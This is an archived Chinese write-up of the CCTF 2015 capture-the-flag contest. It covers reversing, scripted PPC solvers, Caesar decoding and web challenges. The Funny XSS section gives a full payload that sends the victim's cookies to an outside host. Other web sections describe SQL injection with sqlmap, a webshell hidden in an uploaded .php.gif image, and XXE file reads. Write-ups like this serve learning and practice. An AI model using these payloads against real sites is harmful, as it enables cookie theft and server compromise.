---
title: CCTF2015-writeup[LFP]
pubDatetime: 2015-04-27 00:45:04
tags:
  - ctf
description: Already Archive Before 20230604
postSlug: archive_CCTF2015_writeup
---

<!--more-->

### dynamic&static (100pt)

    你是喜欢动态还是静态？（Flag非CCTF{}形式）

    http://pan.baidu.com/s/1dDk0cP7

### 圣诞树 (200pt)

    http://pan.baidu.com/s/1jGxNcZs (3xq8)

    flag非CCTF{}格式


    这两题基本一个模子刻出来的
    唯一不同就是一个是windows下面用了cygwin 一个是elf格式的
    （然而这并没有什么用）（来跟我一起念ida大法好）
    于是ida找到加密那块 直接看代码就出来了
    简简单单的字符串比较

### patient (300pt)

    请提交正确的解密文件的大写MD5值。Flag格式：CCTF{toupper(md5(file))}

    （hint1：这题有两种解法的哦～～！！ 非主流的大概就是我在程序中给你留下的那段话了～～～）
    （hint2：说了两种解法，唔。第一种呢。就是正常的去逆向算法。第二种呢，其实吧，就是那非主流的，其实吧，那句话我只是说给那些用xxxxxxxx的菊苣听的～～～～）

    http://pan.baidu.com/s/14jdim


    这题不放hint简直能做
    看到那十个左右的加密矩阵的我心都是碎的
    而且又不是对称加密 当时就傻逼了

    等到第二个hint出来后
    下了个netkeeper 主程序扔到od跑了一下
    大概就是用户名加密解密那块
    然后我就看到了和题目那个算法完全一样的地方
    然后。。把netkeeper的Credit文件翻出来
    这题就出来了

    原谅只会非主流做法

### PPC(100pt)

    nc 103.224.82.158 8899



    这题是个原题 所以无耻放链接
    https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/BCTF/crypto/weak_enc

### RE 500

先下载编译 `aes-finder`

```
$ git clone https://github.com/mmozeiko/aes-finder.git && cd aes-finder
$ make
```

因为 `aes-finder` 不能直接处理 dump 文件，所以我们把他读进内存，（顺便这样不会有大小端的问题，因为现在平台一致）

```
$ python
>>> target = open("xxxxx", 'rb').read()
```

```
$ ./aes-finder -PID_of_Python
```

找到两个密钥，丢进 Python

```
>>> k = "592063616e20757365206165732d66696e64657220746f20676f742074686973"
>>> "".join(chr(int(k[i:i+2], 16)) for i in range(0, len(k), 2)).replace(" ", "_")
'Y_can_use_aes-finder_to_got_this'
```

好了，交 Key。

### PPC 200

春游途中看到一道 PPC，nc 连了一下发现就是根据显示的 ASCII Art 输入对应字母，脑海中飘过各种不靠谱的方案后决定半自动化打表。

Code :

```python
import telnetlib
import re
import os
import json

data = {}

if os.path.exists('data.js'):
data = json.load(open('data.js'))
print("load ascii:" + " ".join(data.values()))

def Fetching():
s = telnetlib.Telnet("103.224.82.158", 9900)
s.read_until(b"flag.\n")

while True:
r = s.read_until(b"input:").decode()
print(r)
if r.startswith('Reee'):
h = re.search(r"[\s\S]*left\):\n([\s\S]*)\ninput", r).groups()[0]
if h in data:
print("Found")
s.write(data[h].encode('ascii'))
else:
m = input("Text:")
data[h] = m
s.write(m.encode('ascii'))
else:
s.write(input().encode('ascii'))

def save():
with open('data.js', 'w') as fp:
json.dump(data, fp)
try:
Fetching()
except:
pass
finally:
save()
```

### PPC 300

数据格式很是需要一些脑洞，在队友试出了 1,2,3 这种组合后，我们终于意识到这玩意不是个二维坐标。

然后 Python 跑

```python
import telnetlib
s = telnetlib.Telnet(host="103.224.82.158", port=1234)
print(s.read_until('that. :)'.encode('ascii'), 1))
while True:
r = s.read_until('answer:\n'.encode('ascii'), 0.2).decode()
print(r)
if r.strip().startswith('Round'):
table = re.search(r"=======\sHamster\sTable\sStart\s=======\n([\s\S]+)\nInput your answer", r).groups()[0]
new_table = ""
ret = []
for n, i in enumerate(table.split("\n")[::2]):
new_table += i[1::4]
for n, i in enumerate(new_table):
if i != " ":
ret.append(str(n))
ret = ",".join(ret).encode("ascii")
print(ret.decode())
s.write(ret)
```

### circle (50pt)

    Rainism最近忙的转圈圈，你能帮他跳出怪圈么？
    hint:(Rainism 喜欢72式> >...)

    http://103.224.82.130:2333/

    cookie改到72发现页面返回了flag页面,然后是个base64图片,解密即可

### phpspy (100pt)

    大黑阔purpleroc研究了一种不怕被黑阔爆破的shell，0372去purpleroc的blog翻了一份字典怎么都爆破不出来Orz。他只好把题目扔给CCTF的参赛菊苴们来解决了(๑• ̀ᄇ•)́ وﻭ
    hint:这是一个SHELL！！

    http://103.224.81.149:23333/328dab5c4d428b2721397b424f3d6b42.php

    传phpspy执行

### 子卓女神 (150pt)

    情窦初开的小学弟子卓，认识了他的女神，可是却猜不出女神的想法，你可以帮他么？

    http://103.224.82.130:11111/

    先点提交看下页面,发现用了strcmp,查之发现一个漏洞,利用得flag
    ![](http://ac-HSNl7zbI.clouddn.com/WFGU2yVQ12UUPFE8WnkDDHsFCwUn7OWt3ztoFR9F.jpg)

### Funny XSS (200pt)

    破解大黑阔RickGray的Shell后 0372发现大黑阔RickGray自己写了一个XSS防护系统,
    0372看了半天但是却一直没发现有什么猫腻(๑°ㅁ°๑)
    Who Can Bypass mb_ereg_replace?
    {管理员用FireFox}
    (将构造好的payload 发送到Email(gankyou@0xfa.club) Cookies带有flag)

    http://103.224.81.149:23333/2c71e977eccffb1cfb7c6cc22e0e7595.php?x=asd

    直接payload:

`103.224.81.149:23333/2c71e977eccffb1cfb7c6cc22e0e7595.php?x=%ce%3cimg%20src=xss.jpg%20onerror=%28window.location.href=%27http://www.[url].com/cookie.php?value=%27%2bdocument.cookie%29;//`

### 招聘 (300pt)

    0372经过一系列的吊打 觉得自己吊吊哒 于是就是当地安全鸡公司投了简历。。
    结果被呵呵了。。

    hint：开发人员常常在部署环境的时候会忽视一些东西 :(
    ：ide

    http://103.224.82.130:12345/jianli.php

    xxe:发现有个/.idea/workspace.xml （跪WVS）发现目标php页面xxe读之 然后base64解密

### 安全鸡 (400pt)

    0372由于之前的面试被当地的安全鸡公司吊打了Orz。。
    于是便拿起罪恶的电脑(╯>д<)╯ 但是发现他们防御系统好强∑(っ°Д°;)っ 完全把0372这种tools boy挡住了，
    于是又一次。。@CCTF参赛菊居们 (、*●ω●)、

    http://103.224.81.149:43333/7e2363db433a20fc31d9c2fa9a19fc09

    WEB400放出hint 请在QQ群内找群主私聊

    上来先sqlmap,发现卡在表结构不能出字段,手注之;然后是找后台,表名+login.html,php的不行;然后发现是个小小小小的后台,显然禁止改动了,看upload在不在;然后是个上传,a.php.gif图片里插一句话就好

### MISC (100pt)

    你能读出它的意思么？

    Jrypbzr gb ppgs. Rkz ay mkz zu qtuc yusk yosvrk ixevzumxgvne. Fdhvdu flskhu dsshduhg lq dqflhqw plolwdub. Zbqrea nccrnerq n xvaq bs jbeq tnzr ebgO. Qn gwc svwe bpm apqnb kwlm, nbcm jlivfyg cm mi mcgjfy. Uapv xh rdbedhts du iwt uxghi atiitg du tprw hwdgi htcitcrt. Ibqqz b hppe ujnf.

    每句凯撒,爆破之(出来怎么也不对0.0 结果是没加cctf...)
    13.Welcome to cctf.
    20.Let us get to know some simple cryptography.
    23.Caesar cipher appeared in ancient military.
    13. Modern appeared a kind of word game rotB.
    18.If you know the shift code,
    6.this problem is so simple.
    11.Flag is composed of the first letter of each short sentence.
    25.Happy a good time.
    cctf{WLCMItFH}

### Misc 400

    bmp 无脑 binwalk，看到后面附加了一个 rar，然后尝试 unrar 发现密码为 单个 bmp 的 MD5。当然这里被小坑了一下……密码为`a20ab1a5e49e4b140eeae460eeb10b7f`。

    rar 里面是一个 flag 文件，file 查看显示有文件分区的存在，然后使用 testdisk 从里面恢复出文件(直接解压磁盘文件也可以)
